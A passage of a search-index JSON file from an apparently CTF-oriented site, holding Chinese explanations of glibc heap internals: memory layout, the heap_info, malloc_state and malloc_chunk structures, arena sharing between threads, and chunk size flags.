\u5fae\u89c2\u7ed3\u6784\uff0c\u7528\u4e8e\u5177\u4f53\u5904\u7406\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u4e2d\u7684\u5185\u5b58\u5757\u3002","title":"\u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_7","text":"","title":"\u5b8f\u89c2\u7ed3\u6784"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#32","text":"\u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4e3a\uff1a\u4e0d\u53ef\u8bbf\u95ee\u7684\u5185\u6838\u7a7a\u95f4\uff0c\u6808\u7a7a\u95f4\uff08\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u751f\u957f\uff09\uff0c\u5185\u5b58\u5e03\u5c40\u533a\uff0c\u5806\u7a7a\u95f4\uff08\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u751f\u957f\uff09\uff0cBSS\uff0c\u6570\u636e\u6bb5\uff0c\u6587\u672c\u6bb5\u3002\u672c\u62a5\u544a\u8ba8\u8bba\u8fdb\u7a0b\u7684\u6808\u7a7a\u95f4\u548c\u5806\u7a7a\u95f4\u7684\u5177\u4f53\u7ed3\u6784\u3002","title":"32\u4f4d\u5185\u5b58\u5e03\u5c40"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#64","text":"\u7528\u6237\u7a7a\u95f4\u7684\u5e03\u5c40\u548c32\u4f4d\u5dee\u522b\u5f88\u5c0f\u3002","title":"64\u4f4d\u5185\u5b58\u5e03\u5c40"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_8","text":"","title":"\u5806\u7ba1\u7406\u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#3","text":"\u5728 glibc \u7684 malloc \u4e2d\u9488\u5bf9\u5806\u7ba1\u7406\uff0c\u4e3b\u8981\u6d89\u53ca\u5230\u4ee5\u4e0b 3 \u79cd\u6570\u636e\u7ed3\u6784\uff1a heap_info\uff08\u5373Heap Header\uff09\u5bf9\u5e94\u7ba1\u7406 heap malloc_state\uff08\u5373Arena Header\uff09 \u5bf9\u5e94\u7ba1\u7406 area malloc_chunk\uff08\u5373Chunk Header\uff09 \u5bf9\u5e94\u7ba1\u7406 chunk \u8fd9\u91cc\u5806\u7ba1\u7406\u4f1a\u51fa\u73b0\u5728\u591a\u7ebf\u7a0b\uff0c\u4e00\u822cpwn\u9898\u4e0d\u4f1a\u6d89\u53ca\u591a\u7ebf\u7a0b\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u90fd\u662f\u5728 main_area \u4e0a\u64cd\u4f5c\uff0c\u56e0\u6b64\u53ef\u9009\u62e9\u6027\u9605\u8bfb heap_info\u3001malloc_state\u3002","title":"3 \u79cd\u6570\u636e\u7ed3\u6784"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#heap_info","text":"heap_info: \u5373Heap Header\uff0c\u56e0\u4e3a\u4e00\u4e2a**thread arena**\uff08\u6ce8\u610f\uff1a\u4e0d\u5305\u542b**main thread**\uff09\u53ef\u4ee5\u5305\u542b\u591a\u4e2aheaps\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0c\u5c31\u7ed9\u6bcf\u4e2a heap \u5206\u914d\u4e00\u4e2a heap header\u3002\u90a3\u4e48\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4e00\u4e2athread arena\u4f1a\u5305\u542b\u591a\u4e2a heaps \u5462?\u5728\u5f53\u524d heap \u4e0d\u591f\u7528\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 mmap \u7533\u8bf7\u65b0\u7684\u5806\u7a7a\u95f4\uff0c\u65b0\u7684\u5806\u7a7a\u95f4\u4f1a\u88ab\u6dfb\u52a0\u5230\u5f53\u524dthread arena\u4e2d\uff0c\u4fbf\u4e8e\u7ba1\u7406\u3002 typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ -6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ;","title":"heap_info"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#arena","text":"\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u65e0\u8bba\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u72ec\u7acb\u7684 arena \u5462\uff1f\u7b54\u6848\u662f\u5426\u5b9a\u7684\u3002\u4e8b\u5b9e\u4e0a\uff0c*arena*\u7684\u4e2a\u6570\u662f\u8ddf\u7cfb\u7edf\u4e2d\u5904\u7406\u5668\u6838\u5fc3\u4e2a\u6570\u76f8\u5173\u7684\uff0c\u5982\u4e0b\u8868\u6240\u793a\uff1a systems number of arena 32bits 2 x number of cpu cores + 1 64bits 8 x number of cpu cores + 1","title":"Arena \u6570\u91cf\u9650\u5236"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#arena_1","text":"\u5047\u8bbe\u6709\u5982\u4e0b\u60c5\u666f\uff1a\u4e00\u53f0\u53ea\u542b\u6709\u4e00\u4e2a\u5904\u7406\u5668\u6838\u5fc3\u7684\u673a\u5668\u5b89\u88c5\u6709 32 \u4f4d\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u4e0a\u8fd0\u884c\u4e86\u4e00\u4e2a\u591a\u7ebf\u7a0b\u5e94\u7528\u7a0b\u5e8f\uff0c\u5171\u542b\u6709 4 \u4e2a\u7ebf\u7a0b\u2014\u2014\u4e3b\u7ebf\u7a0b\u548c\u4e09\u4e2a\u5b50\u7ebf\u7a0b\u3002\u663e\u7136\u7ebf\u7a0b\u4e2a\u6570\u5927\u4e8e\u7cfb\u7edf\u80fd\u7ef4\u62a4\u7684\u6700\u5927 arena \u4e2a\u6570\uff082 x \u6838\u5fc3\u6570 + 1= 3\uff09\uff0c\u90a3\u4e48\u6b64\u65f6 glibc \u7684 malloc \u5c31\u9700\u8981\u786e\u4fdd\u8fd9 4 \u4e2a\u7ebf\u7a0b\u80fd\u591f\u6b63\u786e\u5730\u5171\u4eab\u8fd9 3 \u4e2a arena \uff0c\u90a3\u4e48\u5b83\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u5462\uff1f \u5f53\u4e3b\u7ebf\u7a0b\u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u4e3a\u5b83\u5206\u914d\u4e00\u4e2a main arena \uff0c\u800c\u4e0d\u9700\u8981\u4efb\u4f55\u9644\u52a0\u6761\u4ef6\u3002 \u5f53\u5b50\u7ebf\u7a0b 1 \u548c\u5b50\u7ebf\u7a0b 2 \u9996\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c glibc \u5b9e\u73b0\u7684 malloc \u4f1a\u5206\u522b\u4e3a\u6bcf\u4e2a\u5b50\u7ebf\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 thread arena \u3002\u6b64\u65f6\uff0c\u5404\u4e2a\u7ebf\u7a0b\u4e0e arena \u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u4f46\u662f\uff0c\u5f53\u7528\u6237\u7ebf\u7a0b 3 \u8c03\u7528 malloc \u7684\u65f6\u5019\u5c31\u51fa\u73b0\u95ee\u9898\u4e86\u3002\u56e0\u4e3a\u6b64\u65f6 glibc \u7684 malloc \u80fd\u7ef4\u62a4\u7684 arena \u4e2a\u6570\u5df2\u7ecf\u8fbe\u5230\u4e0a\u9650\uff0c\u65e0\u6cd5\u518d\u4e3a\u5b50\u7ebf\u7a0b 3 \u5206\u914d\u65b0\u7684 arena \u4e86\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u91cd\u590d\u4f7f\u7528\u5df2\u7ecf\u5206\u914d\u597d\u7684 3 \u4e2a arena \u4e2d\u7684\u4e00\u4e2a\uff08 main arena , arena1 \u6216\u8005 arena2 \uff09\u3002\u90a3\u4e48\u8be5\u9009\u62e9\u54ea\u4e2a arena \u8fdb\u884c\u91cd\u590d\u5229\u7528\u5462\uff1f glibc \u7684 malloc \u9075\u5faa\u4ee5\u4e0b\u89c4\u5219\uff1a \u9996\u5148\u5faa\u73af\u904d\u5386\u6240\u6709\u53ef\u7528\u7684 arena \uff0c\u5728\u904d\u5386\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4f1a\u5c1d\u8bd5\u52a0\u9501\u8be5 arena \u3002\u5982\u679c\u6210\u529f\u52a0\u9501\uff08\u8be5 arena \u5f53\u524d\u5bf9\u5e94\u7684\u7ebf\u7a0b\u5e76\u672a\u4f7f\u7528\u5806\u5185\u5b58\u5219\u8868\u793a\u53ef\u52a0\u9501\uff09\uff0c\u6bd4\u5982\u5c06 main arena \u6210\u529f\u9501\u4f4f\uff0c\u90a3\u4e48\u5c31\u5c06 main arena \u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5373\u8868\u793a\u8be5 arena \u88ab\u5b50\u7ebf\u7a0b 3 \u5171\u4eab\u4f7f\u7528\u3002 \u5982\u679c\u6ca1\u80fd\u627e\u5230\u53ef\u7528\u7684 arena \uff0c\u90a3\u4e48\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u7684 malloc \u64cd\u4f5c\u963b\u585e\uff0c\u76f4\u5230\u6709\u53ef\u7528\u7684 arena \u4e3a\u6b62\u3002 \u73b0\u5728\uff0c\u5982\u679c\u5b50\u7ebf\u7a0b 3 \u518d\u6b21\u8c03\u7528 malloc \u7684\u8bdd\uff0c glibc \u7684 malloc \u5c31\u4f1a\u5148\u5c1d\u8bd5\u4f7f\u7528\u6700\u8fd1\u8bbf\u95ee\u7684 arena \uff08\u6b64\u65f6\u4e3a main arena \uff09\u3002\u5982\u679c\u6b64\u65f6 main arena \u53ef\u7528\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\uff0c\u5426\u5219\u5c31\u5c06\u5b50\u7ebf\u7a0b 3 \u963b\u585e\uff0c\u76f4\u5230 main arena \u518d\u6b21\u53ef\u7528\u4e3a\u6b62\u3002 \u8fd9\u6837\u5b50\u7ebf\u7a0b 3 \u4e0e\u4e3b\u7ebf\u7a0b\u5c31\u5171\u4eab main arena \u4e86\u3002\u81f3\u4e8e\u5176\u4ed6\u66f4\u590d\u6742\u7684\u60c5\u51b5\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002","title":"Arena \u7ba1\u7406"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#malloc_state","text":"malloc_state: \u5373Arena Header\uff0c\u7528\u4e8e\u8868\u793a area \u7684\u4fe1\u606f\uff0c\u6bcf\u4e2athread\u53ea\u542b\u6709\u4e00\u4e2aArena Header\u3002Arena Header\u5305\u542bbins\u7684\u4fe1\u606f\u3001top chunk\u4ee5\u53ca\u6700\u540e\u4e00\u4e2aremainder chunk\u7b49(\u8fd9\u4e9b\u6982\u5ff5\u4f1a\u5728\u540e\u6587\u8be6\u7ec6\u4ecb\u7ecd): struct malloc_state { /* Serialize access. */ mutex_t mutex ; /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins */ unsigned int binmap [ BINMAPSIZE ]; /* Linked list */ struct malloc_state * next ; /* Linked list for free arenas. */ struct malloc_state * next_free ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; };","title":"malloc_state"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#malloc_chunk","text":"malloc_chunk: \u5373Chunk Header\uff0c\u4e00\u4e2aheap\u88ab\u5206\u4e3a\u591a\u4e2achunk\uff0c\u81f3\u4e8e\u6bcf\u4e2achunk\u7684\u5927\u5c0f\uff0c\u8fd9\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u51b3\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u6237\u8c03\u7528malloc(size_t size)\u4f20\u9012\u7684size\u53c2\u6570\u201c\u5c31\u662f\u201dchunk\u7684\u5927\u5c0f(\u8fd9\u91cc\u7ed9\u201c\u5c31\u662f\u201d\u52a0\u4e0a\u5f15\u53f7\uff0c\u8bf4\u660e\u8fd9\u79cd\u8868\u793a\u5e76\u4e0d\u51c6\u786e\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\u5c31\u6682\u65f6\u8fd9\u4e48\u63cf\u8ff0\u4e86\uff0c\u8be6\u7ec6\u8bf4\u660e\u89c1\u540e\u6587)\u3002\u6bcf\u4e2achunk\u90fd\u7531\u4e00\u4e2a\u7ed3\u6784\u4f53malloc_chunk\u8868\u793a\uff1a struct malloc_chunk { /* #define INTERNAL_SIZE_T size_t */ INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. \u8fd9\u4e24\u4e2a\u6307\u9488\u53ea\u5728free chunk\u4e2d\u5b58\u5728*/ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u5173\u4e8e\u4e0a\u8ff0\u7684\u7ed3\u6784\uff08malloc_chunk\u4e3b\u7ebf\u7a0b\u4e5f\u7528\u5230\uff09\uff0c\u9488\u5bf9\u5b50\u7ebf\u7a0b\u7684\uff0c\u4e3b\u7ebf\u7a0b\u548c\u5b50\u7ebf\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\uff1a \u4e3b\u7ebf\u7a0b\u7684\u5806\u4e0d\u662f\u5206\u914d\u5728\u5185\u5b58\u6620\u5c04\u533a\uff0c\u800c\u662f\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5806\u533a\uff0c\u56e0\u6b64\u4e0d\u542b\u6709\u591a\u4e2a heap \u6240\u4ee5\u4e5f\u5c31\u4e0d\u542b\u6709 heap_info \u7ed3\u6784\u4f53\u3002\u5f53\u9700\u8981\u66f4\u591a\u5806\u7a7a\u95f4\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u901a\u8fc7\u589e\u957f brk \u6307\u9488\u6765\u83b7\u53d6\u66f4\u591a\u7684\u7a7a\u95f4\uff0c\u76f4\u5230\u5b83\u78b0\u5230\u5185\u5b58\u6620\u5c04\u533a\u57df\uff08mapping\uff09\u4e3a\u6b62\u3002 \u4e0d\u540c\u4e8e thread arena \uff0c\u4e3b\u7ebf\u7a0b\u7684 main arena \u7684 arena header \u5e76\u4e0d\u5728\u5806\u533a\u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e libc.so \u7684 data segment \u533a\u57df\u3002","title":"malloc_chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#heap-segmentarena","text":"\u9996\u5148\uff0c\u901a\u8fc7\u5185\u5b58\u5206\u5e03\u56fe\u7406\u6e05malloc_state\u4e0eheap_info\u4e4b\u95f4\u7684\u7ec4\u7ec7\u5173\u7cfb\u3002 \u4e0b\u56fe\u662f\u53ea\u6709\u4e00\u4e2aheap segment\u7684main arena\u548cthread arena\u7684\u5185\u5b58\u5206\u5e03\u56fe\uff1a \u4e0b\u56fe\u662f\u4e00\u4e2athread arena\u4e2d\u542b\u6709\u591a\u4e2aheap segments\u7684\u60c5\u51b5\uff1a \u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0cthread arena\u53ea\u542b\u6709\u4e00\u4e2amalloc_state(\u5373arena header)\uff0c\u5374\u6709\u4e24\u4e2aheap_info(\u5373heap header)\u3002\u7531\u4e8e\u4e24\u4e2aheap segments\u662f\u901a\u8fc7mmap\u5206\u914d\u7684\u5185\u5b58\uff0c\u4e24\u8005\u5728\u5185\u5b58\u5e03\u5c40\u4e0a\u5e76\u4e0d\u76f8\u90bb\u800c\u662f\u5206\u5c5e\u4e8e\u4e0d\u540c\u7684\u5185\u5b58\u533a\u95f4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fbf\u4e8e\u7ba1\u7406\uff0clibc malloc\u5c06\u7b2c\u4e8c\u4e2aheap_info\u7ed3\u6784\u4f53\u7684prev\u6210\u5458\u6307\u5411\u4e86\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5373ar_ptr\u6210\u5458\uff09\uff0c\u800c\u7b2c\u4e00\u4e2aheap_info\u7ed3\u6784\u4f53\u7684ar_ptr\u6210\u5458\u6307\u5411\u4e86malloc_state\uff0c\u8fd9\u6837\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u65b9\u4fbf\u540e\u7eed\u7ba1\u7406\u3002","title":"heap segment\u4e0earena\u5173\u7cfb"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_9","text":"","title":"\u5fae\u89c2\u7ed3\u6784"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#chunk","text":"","title":"chunk \u4ecb\u7ecd"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_10","text":"\u5728 glibc malloc \u4e2d\u5c06\u6574\u4e2a\u5806\u5185\u5b58\u7a7a\u95f4\u5206\u6210\u4e86\u8fde\u7eed\u7684\u3001\u5927\u5c0f\u4e0d\u4e00\u7684 chunk \uff0c\u5373\u5bf9\u4e8e\u5806\u5185\u5b58\u7ba1\u7406\u800c\u8a00 chunk \u5c31\u662f\u6700\u5c0f\u64cd\u4f5c\u5355\u4f4d\u3002 chunk \u603b\u5171\u5206\u4e3a 4 \u5927\u7c7b\uff1a allocated chunk free chunk top chunk last remainder chunk \u4ece\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u6240\u6709\u7c7b\u578b\u7684 chunk \u90fd\u662f\u5185\u5b58\u4e2d\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u53ea\u662f\u901a\u8fc7\u8be5\u533a\u57df\u4e2d\u7279\u5b9a\u4f4d\u7f6e\u7684\u67d0\u4e9b\u6807\u8bc6\u7b26\u52a0\u4ee5\u533a\u5206\u3002\u4e3a\u4e86\u7b80\u4fbf\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9 4 \u5927\u7c7b chunk \u7b80\u5316\u4e3a 2 \u7c7b\uff1a allocated chunk \u4ee5\u53ca free chunk \uff0c\u524d\u8005\u8868\u793a\u5df2\u7ecf\u5206\u914d\u7ed9\u7528\u6237\u4f7f\u7528\u7684 chunk \uff0c\u540e\u8005\u8868\u793a\u672a\u4f7f\u7528\u7684 chunk \u3002 \u4efb\u4f55\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u662f\u4ee5 chunk \u4e3a\u5355\u4f4d\u8fdb\u884c\u5806\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u800c\u8fd9\u5c31\u9700\u8981\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u6765\u6807\u5fd7\u5404\u4e2a\u5757\u7684\u8fb9\u754c\uff0c\u4ee5\u53ca\u533a\u5206\u5df2\u5206\u914d\u5757\u548c\u7a7a\u95f2\u5757\u3002\u5927\u591a\u6570\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u5c06\u8fd9\u4e9b\u8fb9\u754c\u4fe1\u606f\u4f5c\u4e3a chunk \u7684\u4e00\u90e8\u5206\u5d4c\u5165\u5230 chunk \u5185\u90e8\u3002 \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\uff08malloc_chunk\uff09\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002","title":"\u6982\u8ff0"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#malloc_chunk-allocated-chunk","text":"malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b: /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size ; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size ; /* Size in bytes, including overhead. */ struct malloc_chunk * fd ; /* double links -- used only if free. */ struct malloc_chunk * bk ; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk * fd_nextsize ; /* double links -- used only if free. */ struct malloc_chunk * bk_nextsize ; }; \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size \u5982\u679c\u8be5 chunk \u7684**\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740 chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00 chunk \u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f (\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2a chunk \u7684\u6570\u636e\u3002**\u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0 \u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684 P \u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2 chunk \u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002 chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3a user data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411 user data \u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk 